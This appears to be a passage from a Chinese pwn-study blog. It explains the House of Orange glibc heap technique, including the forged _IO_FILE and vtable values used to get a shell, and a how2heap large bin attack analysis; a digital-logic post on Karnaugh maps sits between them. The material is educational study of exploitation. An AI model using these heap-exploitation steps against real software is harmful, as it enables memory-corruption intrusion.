class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>接下来，将chunk的size改为0x61，将chunk的bk指针赋值为<code>_IO_list_all-0x10</code>，对应<code>chunk-&gt;bk-&gt;fd</code>。</p>
<p><img src="https://img-blog.csdnimg.cn/c307e3c2e9c14240b7f8b33d57b52698.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQWdDbOKGkQ==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="" /></p>
<p>然后将chunk地址看成一个假的<code>_IO_FILE</code>结构体指针fp，但是在最前面写上’/bin/sh\x00’。将fp-&gt;_mode设为0（偏移为0xC0）【这里的_mode我看了半天才明白原来不应该忽略#ifdef，如果为假则_IO_FILE中有_mode这个元素】、fp-&gt;_IO_write_base设为2、fp-&gt;_IO_write_ptr设为3、fp的jump_table处索引为3（偏移为0x78）设为shell函数地址。最后调用malloc出错，打印错误信息后拿到shell。</p>
<p>_int_malloc中通不过的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br></pre></td></tr></table></figure>
<p>看到这里，虽然整个流程走完了，但还是不禁要问一句，他为什么要这样设定？为什么要改变这些地址？将2016年此方法诞生的那道题——HITCON CTF 2016 House of Orange的解析看完后，便明白了。</p>
<ol>
<li>要在遍历_IO_list_all时拿到shell，所以应该让这个指针指向我们可以控制的内存区域，也就是这个被释放的老top chunk。那既然要遍历_IO_list_all，为什么源码中没有修改这里的值，让其指向old top chunk？</li>
</ol>
<blockquote>
<p>在源码中并没有直接对_IO_list_all中的值进行修改，它是在最后一次调用malloc函数时libc修改的。可以想想如果我们自己写一个双向链表的脱链操作，要将链表中的第一个元素脱链，就必然要在脱链之后将头指针指向原来链表中的第二个元素。因此最后的malloc(0x10)中，libc检查了老top chunk后会将其从unsorted bin中拿出来，之后old top chunk的bk指针指向的(_IO_list_all-0x10)-&gt;fd就会被成功修改，而(_IO_list_all-0x10)-&gt;fd == _IO_list_all。所以这里是在最后被修改的。实际上，这是一种unsorted bin attack。整个攻击流程实际上是unsorted bin attack与FSOP的结合。</p>
</blockquote>
<ol start="2">
<li>这里为什么要将unsorted bin的size改为0x61？</li>
</ol>
<blockquote>
<p><font color=red>注意：malloc函数查找bins的顺序是：fastbins、small bins、unsorted bin、large bins。在搜索unsorted bin时，除分配small bins大小的chunk有时会进行拆分之外，与搜索fastbins相同，返回大小与请求大小正好相等的chunk，其他的chunk会根据大小链入small bins和large bins中。</font>这里将size改为0x61，是为了在malloc时将其链入到smallbins[5]中。在arena的控制结构体中，fastbins的地址在最前面，之后是其他bins的地址，都在一个数组bins中，bins[0]、bins[1]分别为unsorted bin的头指针和尾指针；bins[2]、bins[3]为存放大小为0x20的chunk的small bin的头指针和尾指针…bins[10]、bins[11]就是为存放大小为0x60的chunk的small bin的头指针和尾指针，这也是第5个smallbin。之前_int_malloc函数已经将_IO_list_all修改为top chunk，那么在内存检查失败后会到达top chunk的地方，误认为这是一个_IO_FILE结构体。<br />
<font color=red>这里需要注意_IO_list_all被修改后的值。_IO_list_all是被修改为了unsorted bin头指针，即bins[0]的地址main_arena + 0x58，而不是top chunk的地址。因此，libc实际上会将main_arena + 0x58作为一个_IO_list_all结构体的头部。</font><br />
那么要想让libc遍历到top chunk里面去，还要在后面再链接一个指针指向top chunk。在_IO_FILE结构体中0x68偏移指向的是_IO_FILE* chain，即下一个元素的指针。遍历到一个_IO_FILE_plus时，会执行vtable中的函数。下面是vtable的结构体定义。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>要执行的函数是第4个，因此源码中修改索引为3的值为后门函数。vtable紧跟在_IO_FILE结构体后面，因此也是可以控制的地址。</p>
<ol start="3">
<li>为什么要设置_mode=0，fp-&gt;_IO_write_base=2、fp-&gt;_IO_write_ptr=3？</li>
</ol>
<blockquote>
<p>执行_IO_OVERFLOW函数的是_IO_flush_all_lockp函数，其中调用_IO_OVERFLOW的语句如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>由此可知需要绕过一个检查，即<code>(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</code>，这也就不难理解了。只有绕过它才能执行_IO_OVERFLOW函数。</p>
</blockquote>
<p>总结一下，整个攻击流程大致有这么几步：</p>
<ul>
<li>不使用free函数获得一个unsorted bin中的chunk，同时泄露libc的基地址</li>
<li>构造chunk的结构准备攻击，包括绕过检查、设置system地址到指定地址</li>
<li>用malloc函数触发攻击</li>
</ul>
<p>到这里，House of orange的神秘面纱算是彻底揭开了。能够真正理解这个攻击，我们的水平就又提升了一个档次。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94%E7%94%B5%E8%B7%AF%E8%AE%BE%E8%AE%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8F%98%E5%BD%A2%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94%E7%94%B5%E8%B7%AF%E8%AE%BE%E8%AE%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8F%98%E5%BD%A2%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">数字逻辑 个人总结——电路设计表达式变形总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:14" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:14+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在电路设计中，最直观的方式是与或表达式，但有时这种方式所需的逻辑门电路较多。有时可以对其加以变形。在变形的过程中，通过画出卡诺图能够让我们更加直观地理解其中的变化过程。</p>
<ol>
<li>或与表达式</li>
</ol>
<p>画出卡诺图，圈出0的部分，直接写出或与表达式。</p>
<p><strong>例1</strong></p>
<table>
<thead>
<tr>
<th align="center">CD\AB</th>
<th align="center">00</th>
<th align="center">01</th>
<th align="center">11</th>
<th align="center">10</th>
</tr>
</thead>
<tbody><tr>
<td align="center">00</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">01</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
</tbody></table>
<p>Step 1: 画出0部分的划分圈</p>
<p><img src="https://img-blog.csdnimg.cn/083f490e02b44130b652595f1a2976d9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>红圈实际表示的是$\overline C * \overline D$，在或与表达式中写为$C + D$<br>绿圈实际表示的是$\overline A * \overline B$，在或与表达式中写为$A + B$<br>蓝圈实际表示的是$\overline A * C$，在或与表达式中写为$A + \overline C$</p>
<p>上述卡诺图对应的或与表达式就为：$(C+D)(A+B)(A+\overline C)$</p>
<ol start="2">
<li>与非表达式</li>
</ol>
<p>将与非表达式以电路的形式展现时，电路中只能有与非门这一种门电路。对于每一个与非表达式，其最外面一定是一个非，在非的下面是多个与非表达式的与。这些与非表达式相与的结果应该对应卡诺图中0的部分，也即这里面任何一个与非表达式都应该包含0的所有部分。也即这里面任何一个与非表达式中非下面的部分都不应该包含0的任何部分。这样我们就转化成对1的部分进行分片的操作了。</p>
<p><strong>例2</strong></p>
<p>卡诺图与例1相同，可以将1分为以下3块。</p>
<p><img src="https://img-blog.csdnimg.cn/fc8d02ed738a47859f6bad588391c207.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>红圈实际表示的是$A * C$，在与非表达式中写为 $\overline{A * C}$<br>绿圈实际表示的是$B * \overline C * D$，在与非表达式中写为$\overline {B * \overline C * D}$<br>蓝圈实际表示的是$A * D$，在与非表达式中写为$\overline {A * D}$</p>
<p>上述卡诺图对应的与非表达式就为：$\overline {\overline {A * C} * \overline {B * \overline C * D} * \overline {A * D}}$。它实际上可以由与或表达式加两条杠转化而成，因此根据卡诺图求与非表达式实际上就是求与或表达式，非常方便。</p>
<p>如果要求出花费与非门最少的表达式，则需要关注0部分，为0部分画卡诺圈，这些圈都可以作为共同项写入每一个与非项中。如上例中可以写成$\overline{\overline{\overline{CD}\cdot\overline{A\overline C}A}\cdot\overline{\overline{CD}\cdot\overline{A\overline C}B}}$，这样需要5个与非门，与例2中需要的与非门数量相同。</p>
<ol start="3">
<li>或非表达式</li>
</ol>
<p>使用与非表达式同样的方法进行分析：或非表达式的总的非下面有很多或非表达式的或，他们的或对应所有0的部分。因此其中每一个或非表达式都不能包含任何1的部分，也即其中每一个或非表达式中非的下面都应该包含所有1的部分。这样看来，或非表达式实际上是或与表达式加两条杠转化而来。</p>
<p><strong>例3</strong></p>
<p>卡诺图与例1相同，划分也与例1相同。</p>
<p>红圈实际表示的是$\overline C * \overline D$，在或与表达式中写为$\overline {\overline C + \overline D}$<br>绿圈实际表示的是$\overline A * \overline B$，在或与表达式中写为$\overline {\overline A + \overline B}$<br>蓝圈实际表示的是$\overline A * C$，在或与表达式中写为$\overline {\overline A + C}$</p>
<p>上述卡诺图对应的或非表达式就为：$\overline{\overline {\overline C + \overline D}+\overline {\overline A + \overline B}+\overline {\overline A + C}}$</p>
<ol start="4">
<li>不含反变量的与非表达式</li>
</ol>
<p>如果与非表达式中可以有反变量，则不会产生嵌套，否则可能需要进行嵌套。</p>
<p>我们直接分析例子，一边分析一边总结规律。</p>
<p><strong>例4</strong></p>
<p>卡诺图同例1。</p>
<p>设表达式为$\overline X$，其中$X$是一系列与非表达式的与。则$X$表示的是图中所有0的部分。所有的与非项都应包含所有0部分。<br>其中，$\overline {AD}$和$\overline {CD}$仍然可用，这与例2相同，但例2中的$\overline {B * \overline C * D}$不再可用，我们必须将内部的$\overline C$换掉。方法很简单，将$\overline {C}$改成$\overline {B<em>C</em>D}$即可。在具体设计电路的情景下，这里的$\overline {B<em>C</em>D}$也可以改成$\overline {B<em>C}$或$\overline {C</em>D}$，看如何修改使逻辑门电路的输出结果得到最大限度的复用。</p>
<p>因此，如果我们想要获得不含反变量的与非表达式，只需要将原来的反变量下添加与其相乘的正变量即可，且是否添加均可选，但不能都不选。</p>
<p>但是不难发现，上述方法产生的表达式至多只有两层嵌套，能否利用多层嵌套实现功能呢？</p>
<ol start="5">
<li>高阶与非表达式探究（慎用！）<br>对于含有4个变量的形如$\overline{\overline{\overline {AB}C}D}$（3个与非门）的与非表达式（$A\ne B$），其需要3个与非门完成，等价于$\overline{\overline CD+ABD}$（4个与非门），使用代换规则可以在卡诺图中构造出类似于这样的很多表达式。当四个变量均不相同时，卡诺图中0的个数应为5。从与非表达式转换为与或表达式不如从与或表达式转换为与非表达式有用。如果题中明确采用与非表达式且要求使用的门电路最少，不妨可以考虑这种高阶与非表达式，有利于构造不规则卡诺图形状。观察到其转化后的与非项两项都有$D$，因此反带时可以将非反变量的共同项看成是$D$。但要注意，在$\overline C$和$AB$的选择上，有时两项除共同项外无法直接配出这两项，这时不适合使用高阶表达式，直接采用第四点中的表达式即可。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-8/" class="post-title-link" itemprop="url">how2heap 深入学习(8)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:13 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:13+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/glibc-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">glibc 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>how2heap下载网址: <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">传送门</a><br />
Glibc源码查看网址：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3516">传送门</a><br />
参考书籍：CTF竞赛权威指南-pwn篇</p>
<p>测试环境：Ubuntu 18.04<br />
Glibc 版本：Ubuntu GLIBC 2.27-3ubuntu1.5</p>
<p>按照顺序，本文将分析glibc 2.27文件夹下的第9~16个源码，重点对源码进行分析与解读。一些2.23版本中出现过的漏洞将不再赘述。<br />
如果本文的分析有任何错漏之处，还请各位读者不吝赐教，不胜感激。</p>
<h1 id="9-large_bin_attack"><a class="markdownIt-Anchor" href="#9-large_bin_attack"></a> 9. large_bin_attack</h1>
<p>简单看了一下源码，和2.23版本的没有什么区别，有关于large bin的链入过程已经在上一篇文章详细推演过了，这里解释一下large bin attack的大致操作流程。</p>
<p><strong>Step 1: 构造堆环境</strong></p>
<p>在分配3块大内存后释放前2块之后，unsorted bin中有2个chunk。</p>
<p>之后，会分配一个0x100大小的堆块，由于last_remainder始终为空，因此这会导致两个unsorted bin中的chunk首先被链入到large bins中。</p>
<p>到此为止，_int_malloc函数仍然没有找到能够分配给用户的chunk，那么下一步就是在large bins中寻找并切割chunk，这也是last_remainder从NULL被赋值为一个有效地址的唯一方式。下面就来具体分析一下这个子过程。</p>
<h2 id="切割large-bins-chunk返回的过程"><a class="markdownIt-Anchor" href="#切割large-bins-chunk返回的过程"></a> 切割large bins chunk返回的过程</h2>
<p>下面是这个子过程的源码，在第4步大循环中执行。第4步大循环首先进入一个while小循环将unsorted bin整理完毕，然后再向下执行，到达这个子过程。中间跳过了一个检查是否分配的是大chunk的过程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">              <span class="keyword">goto</span> use_top;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">    <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        assert (bit != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">    victim = last (bin);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">    <span class="keyword">if</span> (victim == bin)</span><br><span class="line">      &#123;</span><br><span class="line">        av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">        assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* unlink */</span></span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">               have to perform a complete insert here.  */</span></span><br><span class="line">            bck = unsorted_chunks (av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">            remainder-&gt;bk = bck;</span><br><span class="line">            remainder-&gt;fd = fwd;</span><br><span class="line">            bck-&gt;fd = remainder;</span><br><span class="line">            fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">            <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">              &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line">          &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>在一开始，有block，map，bit这三个变量的赋值，这三个变量是干嘛的呢？注意在2.27的malloc_state中，第8个成员，也就是bins下面一个成员是一个叫binmap的东西，这个成员通过比特位来记录哪些bins当前存有chunk，哪些没有chunk，这是为了在后面查找chunk的时候不用每一个bin都过去检查是否为空。从下面的定义中可以看出，binmap是一个unsorted int类型，一个整型变量可以保存32个bin的“是否为空”的信息。那么一开始的<code>block = idx2block (idx);</code>就是为了找到对应索引（idx）的比特位信息在哪个索引中。<code>map = av-&gt;binmap[block];</code>则定位索引对应的无符号整型变量，<code>bit = idx2bit (idx);</code>则定位到该idx的比特位，从后面这句<code>while ((bit &amp; map) == 0)</code>可以看出，bit应该是诸如0x100，0x10000，0x1000000这样的数，与map做按位与处理判断某位上是否为1。</p>
